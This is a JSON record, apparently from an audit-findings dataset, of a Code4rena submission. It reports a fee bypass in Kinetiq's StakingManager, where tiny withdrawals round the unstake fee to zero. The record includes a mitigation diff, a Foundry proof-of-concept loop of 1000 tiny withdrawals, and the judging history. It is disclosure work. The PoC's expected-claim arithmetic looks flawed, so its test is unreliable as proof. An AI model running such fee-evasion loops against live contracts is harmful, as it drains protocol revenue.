@@ -1,0 +1,148 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "Kinetiq_k8aVPPVguSE",
+    "audit_uid": "k8aVPPVguSE",
+    "requested_submission_uid": "eEvYodNRrvz",
+    "requested_finding_uid": "bP38mw3SCq2",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/Kinetiq_k8aVPPVguSE/20260618_143339/findings.json",
+    "source_submission_uid": "eEvYodNRrvz",
+    "source_finding_uid": "bP38mw3SCq2",
+    "original_report_path": "Kinetiq_k8aVPPVguSE\\low_valid_eEvYodNRrvz.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "eEvYodNRrvz",
+  "finding_uid": "bP38mw3SCq2",
+  "finding_number": "330",
+  "title": "A User Can Withdraw Tiny Amounts to Bypass Fees",
+  "severity": "medium",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "forgetfore1",
+  "body": "# A User Can Withdraw Tiny Amounts to Bypass Fees\n\n## Finding Description and Impact\n\nIn the function `StakingManager::queueWithdrawal`, if a user passes an amount such that `amount * unstakeFeeRate < BASIS_POINTS`, the `kHYPEFee` is set to `0`:\n\n```solidity\nuint256 kHYPEFee = msg.sender == treasury ? 0 : Math.mulDiv(kHYPEAmount, unstakeFeeRate, BASIS_POINTS);\n```\n\nThis allows a user to bypass fees by withdrawing their stake in very small increments.\n\n- **Likelihood**: Low – This vulnerability is unlikely to be exploited at scale, as the gas cost would exceed the value of the avoided fees.  \n- **Impact**: High – Potential loss of protocol fees.\n\n## Recommended Mitigation\n\nTo fix this issue, it is recommended to introduce a minimum withdrawal amount in the `StakingManager::queueWithdrawal` function:\n\n```diff\nfunction queueWithdrawal(uint256 kHYPEAmount) external nonReentrant whenNotPaused whenWithdrawalNotPaused {\n    // Check whitelist if enabled\n    if (whitelistEnabled) {\n        require(isWhitelisted(msg.sender), \"Address not whitelisted\");\n    }\n\n-   require(kHYPEAmount > 0, \"Invalid amount\");\n+   require(kHYPEAmount > MIN_WITHDRAWAL, \"Invalid amount\");\n    require(kHYPE.balanceOf(msg.sender) >= kHYPEAmount, \"Insufficient kHYPE balance\");\n\n    uint256 withdrawalId = nextWithdrawalId[msg.sender];\n\n    // Calculate fee in kHYPE using mulDiv for precision\n    uint256 kHYPEFee = msg.sender == treasury ? 0 : Math.mulDiv(kHYPEAmount, unstakeFeeRate, BASIS_POINTS);\n    uint256 postFeeKHYPE = kHYPEAmount - kHYPEFee;\n\n    // Convert post-fee kHYPE to HYPE using StakingAccountant\n    uint256 hypeAmount = stakingAccountant.kHYPEToHYPE(postFeeKHYPE);\n\n    // Lock kHYPE tokens\n    kHYPE.transferFrom(msg.sender, address(this), kHYPEAmount);\n\n    // Create withdrawal request\n    _withdrawalRequests[msg.sender][withdrawalId] = WithdrawalRequest({\n        hypeAmount: hypeAmount,\n        kHYPEAmount: postFeeKHYPE,\n        kHYPEFee: kHYPEFee,\n        timestamp: block.timestamp\n    });\n\n    nextWithdrawalId[msg.sender]++;\n    totalQueuedWithdrawals += hypeAmount;\n\n    // Withdraw from current delegation\n    address currentDelegation = validatorManager.getDelegation(address(this));\n    require(currentDelegation != address(0), \"No delegation set\");\n    _withdrawFromValidator(currentDelegation, hypeAmount, OperationType.UserWithdrawal);\n\n    emit WithdrawalQueued(address(this), msg.sender, withdrawalId, kHYPEAmount, hypeAmount, kHYPEFee);\n}\n```",
+  "proof_of_concept": "## Proof of Concept\n\nAdd the following test to `StakingManager.t.sol`:\n\n```javascript\nfunction test_QueueWithdrawal_BypassFee() public {\n    // Setup initial stake and withdrawal\n    uint256 stakeAmount = 1 ether;\n\n    vm.startPrank(manager);\n    validatorManager.activateValidator(validator);\n    validatorManager.setDelegation(address(stakingManager), validator);\n    vm.stopPrank();\n\n    vm.deal(user, stakeAmount);\n    vm.prank(user);\n    stakingManager.stake{value: stakeAmount}();\n\n    // Approve and queue withdrawal\n    vm.startPrank(user);\n    kHYPE.approve(address(stakingManager), stakeAmount);\n\n    // Unstake just enough to bypass fees (999 * 10 < 10000)\n    uint unstakeAmount = 999;\n    uint nbSlices = 1000;\n\n    // Store withdrawal IDs for batch confirmation\n    uint256[] memory withdrawalIds = new uint[](nbSlices);\n\n    for (uint i = 0; i < nbSlices; i++) {\n        stakingManager.queueWithdrawal(unstakeAmount);\n        withdrawalIds[i] = i;\n    }\n\n    vm.stopPrank();\n\n    // Add ETH to the contract to process withdrawals\n    vm.deal(address(stakingManager), stakeAmount);\n\n    // Set withdrawal delay to 0 to allow immediate confirmation\n    vm.prank(manager);\n    stakingManager.setWithdrawalDelay(0);\n\n    // Confirm withdrawals\n    vm.prank(user);\n    vm.expectEmit(true, true, true, true);\n    stakingManager.batchConfirmWithdrawals(withdrawalIds);\n\n    // The total amount unstaked\n    uint effectiveUnstakeAmount = unstakeAmount * nbSlices;\n\n    // Calculate expected fee\n    uint256 feeRate = stakingManager.unstakeFeeRate();\n    uint256 expectedFee = (effectiveUnstakeAmount * feeRate) / stakingManager.BASIS_POINTS();\n    uint256 expectedClaimedAmount = (effectiveUnstakeAmount - expectedFee) * nbSlices;\n\n    console.log(\"Expected Claim:\", expectedClaimedAmount);\n    console.log(\"Claimed Amount:\", stakingManager.totalClaimed());\n\n    assertEq(stakingManager.totalQueuedWithdrawals(), 0);\n    assertLt(stakingManager.totalClaimed(), expectedClaimedAmount, \"Total claimed should account for fee\");\n}\n```\n\nTest output:\n\n```\nExpected Claim: 998001000\nClaimed Amount: 999000\n```",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-04-kinetiq/blob/7f29c917c09341672e73be2f7917edf920ea2adb/src/StakingManager.sol#L262"
+  ],
+  "source_record": {
+    "project_id": "k8aVPPVguSE",
+    "submission_index": "561",
+    "api_submission_id": "",
+    "uid": "eEvYodNRrvz",
+    "number": "561",
+    "title": "A User Can Withdraw Tiny Amounts to Bypass Fees",
+    "severity": "medium",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "forgetfore1",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-04-kinetiq/blob/7f29c917c09341672e73be2f7917edf920ea2adb/src/StakingManager.sol#L262"
+    ],
+    "body": "# A User Can Withdraw Tiny Amounts to Bypass Fees\n\n## Finding Description and Impact\n\nIn the function `StakingManager::queueWithdrawal`, if a user passes an amount such that `amount * unstakeFeeRate < BASIS_POINTS`, the `kHYPEFee` is set to `0`:\n\n```solidity\nuint256 kHYPEFee = msg.sender == treasury ? 0 : Math.mulDiv(kHYPEAmount, unstakeFeeRate, BASIS_POINTS);\n```\n\nThis allows a user to bypass fees by withdrawing their stake in very small increments.\n\n- **Likelihood**: Low – This vulnerability is unlikely to be exploited at scale, as the gas cost would exceed the value of the avoided fees.  \n- **Impact**: High – Potential loss of protocol fees.\n\n## Recommended Mitigation\n\nTo fix this issue, it is recommended to introduce a minimum withdrawal amount in the `StakingManager::queueWithdrawal` function:\n\n```diff\nfunction queueWithdrawal(uint256 kHYPEAmount) external nonReentrant whenNotPaused whenWithdrawalNotPaused {\n    // Check whitelist if enabled\n    if (whitelistEnabled) {\n        require(isWhitelisted(msg.sender), \"Address not whitelisted\");\n    }\n\n-   require(kHYPEAmount > 0, \"Invalid amount\");\n+   require(kHYPEAmount > MIN_WITHDRAWAL, \"Invalid amount\");\n    require(kHYPE.balanceOf(msg.sender) >= kHYPEAmount, \"Insufficient kHYPE balance\");\n\n    uint256 withdrawalId = nextWithdrawalId[msg.sender];\n\n    // Calculate fee in kHYPE using mulDiv for precision\n    uint256 kHYPEFee = msg.sender == treasury ? 0 : Math.mulDiv(kHYPEAmount, unstakeFeeRate, BASIS_POINTS);\n    uint256 postFeeKHYPE = kHYPEAmount - kHYPEFee;\n\n    // Convert post-fee kHYPE to HYPE using StakingAccountant\n    uint256 hypeAmount = stakingAccountant.kHYPEToHYPE(postFeeKHYPE);\n\n    // Lock kHYPE tokens\n    kHYPE.transferFrom(msg.sender, address(this), kHYPEAmount);\n\n    // Create withdrawal request\n    _withdrawalRequests[msg.sender][withdrawalId] = WithdrawalRequest({\n        hypeAmount: hypeAmount,\n        kHYPEAmount: postFeeKHYPE,\n        kHYPEFee: kHYPEFee,\n        timestamp: block.timestamp\n    });\n\n    nextWithdrawalId[msg.sender]++;\n    totalQueuedWithdrawals += hypeAmount;\n\n    // Withdraw from current delegation\n    address currentDelegation = validatorManager.getDelegation(address(this));\n    require(currentDelegation != address(0), \"No delegation set\");\n    _withdrawFromValidator(currentDelegation, hypeAmount, OperationType.UserWithdrawal);\n\n    emit WithdrawalQueued(address(this), msg.sender, withdrawalId, kHYPEAmount, hypeAmount, kHYPEFee);\n}\n```",
+    "proof_of_concept": "## Proof of Concept\n\nAdd the following test to `StakingManager.t.sol`:\n\n```javascript\nfunction test_QueueWithdrawal_BypassFee() public {\n    // Setup initial stake and withdrawal\n    uint256 stakeAmount = 1 ether;\n\n    vm.startPrank(manager);\n    validatorManager.activateValidator(validator);\n    validatorManager.setDelegation(address(stakingManager), validator);\n    vm.stopPrank();\n\n    vm.deal(user, stakeAmount);\n    vm.prank(user);\n    stakingManager.stake{value: stakeAmount}();\n\n    // Approve and queue withdrawal\n    vm.startPrank(user);\n    kHYPE.approve(address(stakingManager), stakeAmount);\n\n    // Unstake just enough to bypass fees (999 * 10 < 10000)\n    uint unstakeAmount = 999;\n    uint nbSlices = 1000;\n\n    // Store withdrawal IDs for batch confirmation\n    uint256[] memory withdrawalIds = new uint[](nbSlices);\n\n    for (uint i = 0; i < nbSlices; i++) {\n        stakingManager.queueWithdrawal(unstakeAmount);\n        withdrawalIds[i] = i;\n    }\n\n    vm.stopPrank();\n\n    // Add ETH to the contract to process withdrawals\n    vm.deal(address(stakingManager), stakeAmount);\n\n    // Set withdrawal delay to 0 to allow immediate confirmation\n    vm.prank(manager);\n    stakingManager.setWithdrawalDelay(0);\n\n    // Confirm withdrawals\n    vm.prank(user);\n    vm.expectEmit(true, true, true, true);\n    stakingManager.batchConfirmWithdrawals(withdrawalIds);\n\n    // The total amount unstaked\n    uint effectiveUnstakeAmount = unstakeAmount * nbSlices;\n\n    // Calculate expected fee\n    uint256 feeRate = stakingManager.unstakeFeeRate();\n    uint256 expectedFee = (effectiveUnstakeAmount * feeRate) / stakingManager.BASIS_POINTS();\n    uint256 expectedClaimedAmount = (effectiveUnstakeAmount - expectedFee) * nbSlices;\n\n    console.log(\"Expected Claim:\", expectedClaimedAmount);\n    console.log(\"Claimed Amount:\", stakingManager.totalClaimed());\n\n    assertEq(stakingManager.totalQueuedWithdrawals(), 0);\n    assertLt(stakingManager.totalClaimed(), expectedClaimedAmount, \"Total claimed should account for fee\");\n}\n```\n\nTest output:\n\n```\nExpected Claim: 998001000\nClaimed Amount: 999000\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/k8aVPPVguSE/submissions/561",
+    "raw": {
+      "auditUid": "k8aVPPVguSE",
+      "createdAt": "2025-04-15T16:59:46.957Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "Whkz9MaBeiQ",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "validator",
+          "createdAt": "2025-04-22T12:52:18.423Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "eEvYodNRrvz",
+          "findingUid": null
+        },
+        {
+          "uid": "vRFcnqpVAbP",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "validator",
+          "createdAt": "2025-04-22T12:52:18.423Z",
+          "type": "severity",
+          "value": "medium",
+          "submissionUid": null,
+          "findingUid": "bP38mw3SCq2"
+        },
+        {
+          "uid": "rbmkpfegVUr",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "validator",
+          "createdAt": "2025-04-22T12:52:18.423Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "bP38mw3SCq2"
+        },
+        {
+          "uid": "BziADh4QC5a",
+          "userUid": "tZ7iSgbTXG2",
+          "userAuditRole": "sponsor",
+          "createdAt": "2025-04-23T02:18:20.665Z",
+          "type": "validity",
+          "value": "wontfix",
+          "submissionUid": null,
+          "findingUid": "bP38mw3SCq2"
+        },
+        {
+          "uid": "Cm3zSqngsaH",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-04-26T08:30:31.814Z",
+          "type": "severity",
+          "value": "low",
+          "submissionUid": null,
+          "findingUid": "bP38mw3SCq2"
+        },
+        {
+          "uid": "KmKeQZU3evm",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-04-26T08:30:57.448Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "bP38mw3SCq2"
+        }
+      ],
+      "finding": {
+        "uid": "bP38mw3SCq2",
+        "number": 330,
+        "duplicates": 10
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "low",
+        "validity": "valid",
+        "updatedAt": "2025-05-07T15:00:47.683Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "medium",
+      "team": null,
+      "title": "A User Can Withdraw Tiny Amounts to Bypass Fees",
+      "uid": "eEvYodNRrvz",
+      "updatedAt": "2025-04-15T16:59:46.957Z",
+      "user": {
+        "uid": "uVtrJVFvoct",
+        "handle": "forgetfore1"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "# A User Can Withdraw Tiny Amounts to Bypass Fees\n\n## Finding Description and Impact\n\nIn the function `StakingManager::queueWithdrawal`, if a user passes an amount such that `amount * unstakeFeeRate < BASIS_POINTS`, the `kHYPEFee` is set to `0`:\n\n```solidity\nuint256 kHYPEFee = msg.sender == treasury ? 0 : Math.mulDiv(kHYPEAmount, unstakeFeeRate, BASIS_POINTS);\n```\n\nThis allows a user to bypass fees by withdrawing their stake in very small increments.\n\n- **Likelihood**: Low – This vulnerability is unlikely to be exploited at scale, as the gas cost would exceed the value of the avoided fees.  \n- **Impact**: High – Potential loss of protocol fees.\n\n## Recommended Mitigation\n\nTo fix this issue, it is recommended to introduce a minimum withdrawal amount in the `StakingManager::queueWithdrawal` function:\n\n```diff\nfunction queueWithdrawal(uint256 kHYPEAmount) external nonReentrant whenNotPaused whenWithdrawalNotPaused {\n    // Check whitelist if enabled\n    if (whitelistEnabled) {\n        require(isWhitelisted(msg.sender), \"Address not whitelisted\");\n    }\n\n-   require(kHYPEAmount > 0, \"Invalid amount\");\n+   require(kHYPEAmount > MIN_WITHDRAWAL, \"Invalid amount\");\n    require(kHYPE.balanceOf(msg.sender) >= kHYPEAmount, \"Insufficient kHYPE balance\");\n\n    uint256 withdrawalId = nextWithdrawalId[msg.sender];\n\n    // Calculate fee in kHYPE using mulDiv for precision\n    uint256 kHYPEFee = msg.sender == treasury ? 0 : Math.mulDiv(kHYPEAmount, unstakeFeeRate, BASIS_POINTS);\n    uint256 postFeeKHYPE = kHYPEAmount - kHYPEFee;\n\n    // Convert post-fee kHYPE to HYPE using StakingAccountant\n    uint256 hypeAmount = stakingAccountant.kHYPEToHYPE(postFeeKHYPE);\n\n    // Lock kHYPE tokens\n    kHYPE.transferFrom(msg.sender, address(this), kHYPEAmount);\n\n    // Create withdrawal request\n    _withdrawalRequests[msg.sender][withdrawalId] = WithdrawalRequest({\n        hypeAmount: hypeAmount,\n        kHYPEAmount: postFeeKHYPE,\n        kHYPEFee: kHYPEFee,\n        timestamp: block.timestamp\n    });\n\n    nextWithdrawalId[msg.sender]++;\n    totalQueuedWithdrawals += hypeAmount;\n\n    // Withdraw from current delegation\n    address currentDelegation = validatorManager.getDelegation(address(this));\n    require(currentDelegation != address(0), \"No delegation set\");\n    _withdrawFromValidator(currentDelegation, hypeAmount, OperationType.UserWithdrawal);\n\n    emit WithdrawalQueued(address(this), msg.sender, withdrawalId, kHYPEAmount, hypeAmount, kHYPEFee);\n}\n```",
+      "proofOfConcept": "## Proof of Concept\n\nAdd the following test to `StakingManager.t.sol`:\n\n```javascript\nfunction test_QueueWithdrawal_BypassFee() public {\n    // Setup initial stake and withdrawal\n    uint256 stakeAmount = 1 ether;\n\n    vm.startPrank(manager);\n    validatorManager.activateValidator(validator);\n    validatorManager.setDelegation(address(stakingManager), validator);\n    vm.stopPrank();\n\n    vm.deal(user, stakeAmount);\n    vm.prank(user);\n    stakingManager.stake{value: stakeAmount}();\n\n    // Approve and queue withdrawal\n    vm.startPrank(user);\n    kHYPE.approve(address(stakingManager), stakeAmount);\n\n    // Unstake just enough to bypass fees (999 * 10 < 10000)\n    uint unstakeAmount = 999;\n    uint nbSlices = 1000;\n\n    // Store withdrawal IDs for batch confirmation\n    uint256[] memory withdrawalIds = new uint[](nbSlices);\n\n    for (uint i = 0; i < nbSlices; i++) {\n        stakingManager.queueWithdrawal(unstakeAmount);\n        withdrawalIds[i] = i;\n    }\n\n    vm.stopPrank();\n\n    // Add ETH to the contract to process withdrawals\n    vm.deal(address(stakingManager), stakeAmount);\n\n    // Set withdrawal delay to 0 to allow immediate confirmation\n    vm.prank(manager);\n    stakingManager.setWithdrawalDelay(0);\n\n    // Confirm withdrawals\n    vm.prank(user);\n    vm.expectEmit(true, true, true, true);\n    stakingManager.batchConfirmWithdrawals(withdrawalIds);\n\n    // The total amount unstaked\n    uint effectiveUnstakeAmount = unstakeAmount * nbSlices;\n\n    // Calculate expected fee\n    uint256 feeRate = stakingManager.unstakeFeeRate();\n    uint256 expectedFee = (effectiveUnstakeAmount * feeRate) / stakingManager.BASIS_POINTS();\n    uint256 expectedClaimedAmount = (effectiveUnstakeAmount - expectedFee) * nbSlices;\n\n    console.log(\"Expected Claim:\", expectedClaimedAmount);\n    console.log(\"Claimed Amount:\", stakingManager.totalClaimed());\n\n    assertEq(stakingManager.totalQueuedWithdrawals(), 0);\n    assertLt(stakingManager.totalClaimed(), expectedClaimedAmount, \"Total claimed should account for fee\");\n}\n```\n\nTest output:\n\n```\nExpected Claim: 998001000\nClaimed Amount: 999000\n```",
+      "linesOfCode": "https://github.com/code-423n4/2025-04-kinetiq/blob/7f29c917c09341672e73be2f7917edf920ea2adb/src/StakingManager.sol#L262",
+      "number": 561,
+      "aiExplanation": null,
+      "_index": 561
+    }
+  }
+}
